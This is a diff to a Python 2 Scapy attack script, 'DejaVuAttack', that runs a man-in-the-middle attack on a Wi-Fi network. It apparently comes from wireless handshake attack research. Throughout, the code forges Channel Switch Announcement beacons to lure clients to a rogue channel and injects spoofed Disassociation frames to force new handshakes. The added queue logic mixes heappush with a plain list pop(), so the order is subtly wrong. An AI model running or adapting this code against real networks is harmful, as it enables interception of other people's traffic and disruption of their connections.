@@ -1,6 +1,6 @@
 #!/usr/bin/env python2
 from scapy.all import *
-import sys, os, struct, time, argparse
+import sys, os, struct, time, argparse, heapq
 from datetime import datetime
 
 CHANNEL_AP    = 1                   # Channel of the original AP
@@ -164,6 +164,7 @@ class DejaVuAttack():
 		self.sock_real  = None
 		self.sock_rogue = None
 		self.clients = dict()
+		self.disas_queue = []
 
 	def find_beacon(self, ssid):
 		p = sniff(count=1, timeout=2, lfilter=lambda p: get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
@@ -171,6 +172,24 @@ class DejaVuAttack():
 			raise Exception("No beacon received of network <%s>. Is monitor mode working, and are you on the AP's channel?" % ssid)
 		self.beacon = p[0][Dot11]
 		self.apmac = self.beacon.addr2
+
+	def send_csa_beacon(self):
+		csabeacon = append_csa(self.beacon)
+		send_dot11(self.sock_real, csabeacon)
+		log(STATUS, "Injected CSA beacon", color="green")
+
+	def send_disas(self, macaddr):
+		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
+		send_dot11(self.sock_rogue, p)
+		log(STATUS, "Injected Disassociation to %s" % macaddr, color="green")
+
+	def queue_disas(self, macaddr):
+		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
+		heapq.heappush(self.disas_queue, (time.time() + 2, macaddr))
+
+	def try_channel_switch(self, macaddr):
+		self.send_csa_beacon()
+		self.queue_disas(macaddr)
 
 	def intercept_sentby_ap(self, p, client=None):
 		if client and not client.is_mitmed: return
@@ -195,14 +214,13 @@ class DejaVuAttack():
 		p = recv_dot11(self.sock_real)
 		if p == None: return
 
-		# TODO: When a failed MitM is detected, queue a CSA beacon and Disassociation
-
 		# 1a. Track wether the targeted client is directly sending to the AP on the real channel
 		if self.clientmac is not None and self.clientmac == p.addr2 and p.addr1 == self.apmac:
 			print_rx(INFO, "Real channel ", p)
 			if Dot11Auth in p:
 				log(WARNING, "Client %s is connecting to the AP on the real channel. MitM failed." % self.clientmac)
 				if p.addr2 in self.clients: self.clients[p.addr2].reset()
+				self.try_channel_switch(p.addr2)
 		# 1b. And display all other frames it is sending or receiving
 		elif self.clientmac is not None and (self.clientmac in [p.addr1, p.addr2]) and (self.apmac in [p.addr1, p.addr2]):
 			print_rx(INFO, "Real channel ", p)
@@ -210,6 +228,7 @@ class DejaVuAttack():
 		elif p.addr1 == self.apmac and Dot11Auth in p:
 			print_rx(INFO, "Real channel ", p, color="orange")
 			if p.addr2 in self.clients: self.clients[p.addr2].reset()
+			self.try_channel_switch(p.addr2)
 
 		# 3. Now focus on data send by the real AP to a client we are MitM'ing or want to target
 		if p.addr2 != self.apmac: return
@@ -230,20 +249,23 @@ class DejaVuAttack():
 			print_rx(INFO, "Rouge channel", p)
 			return
 
-		# 2. Check if it's a new client that we can MitM
-		if p.addr1 == self.apmac and Dot11Auth in p:
-			log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green")
+		# 2. Now focus on data send by a MitM'ed (or about to be MitM'ed) client towards the AP
+		if p.addr1 != self.apmac: return
+		if not p.addr2 in self.clients and not Dot11Auth in p: return
+
+		print_rx(INFO, "Rogue channel", p)
+
+		# 3. Check if it's a new client that we can MitM
+		if Dot11Auth in p:
+			log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green", showtime=False)
 			self.clients[p.addr2] = ClientState(p.addr2)
 			self.clients[p.addr2].is_mitmed = True
 
-		# 3. Now focus on data send by a MitM'ed client towards the AP
-		if not p.addr2 in self.clients: return
-		if p.addr1 != self.apmac: return
-		
+		# 4. TODO: Is it useful to check and set is_mitmed ???
 		client = self.clients[p.addr2]
 		if not client.is_mitmed: return None
 
-		print_rx(INFO, "Rogue channel", p)
+		
 
 		# 4. We block and store Msg4 to forward it when the attack is done -- FIXME encrypted Msg4's and forwarded anyway...??
 		#eapolnum = get_eapol_msgnum(p)
@@ -279,7 +301,6 @@ class DejaVuAttack():
 
 		send_dot11(self.sock_real, p)
 
-
 	def run(self):
 		# Make sure to use a recent backports driver package so we can indeed
 		# capture and inject packets in monitor mode.
@@ -291,24 +312,19 @@ class DejaVuAttack():
 		log(STATUS, "Target network detected: " + self.apmac, color="green")
 
 		# Inject a CSA beacon to push victims to our channel -- FIXME: dynamic channel
-		csabeacon = append_csa(self.beacon)
-		send_dot11(self.sock_real, csabeacon)
-		log(STATUS, "Injected CSA beacon", color="green")
+		self.send_csa_beacon()
 
 		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake
-		time.sleep(2)
-		if self.clientmac is None:
-			log(STATUS, "No target client given: cannot inject Disassociation to force new handshake")
-		else:
-			p = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
-			send_dot11(self.sock_rogue, p)
-			log(STATUS, "Injected Disassociation to %s" % self.clientmac, color="green")
+		if self.clientmac is None: log(STATUS, "No target client given: cannot inject Disassociation to force new handshake")
+		else:                      self.queue_disas(self.clientmac)
 
 		# Continue attack by monitoring both channels and performing needed actions
 		while True:
-			sel = select([self.sock_rogue, self.sock_real], [], [])
+			sel = select([self.sock_rogue, self.sock_real], [], [], 0.5)
 			if self.sock_real  in sel[0]: self.handle_rx_realchan()
 			if self.sock_rogue in sel[0]: self.handle_rx_roguechan()
+			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
+				self.send_disas(self.disas_queue.pop()[1])
 
 
 if __name__ == "__main__":
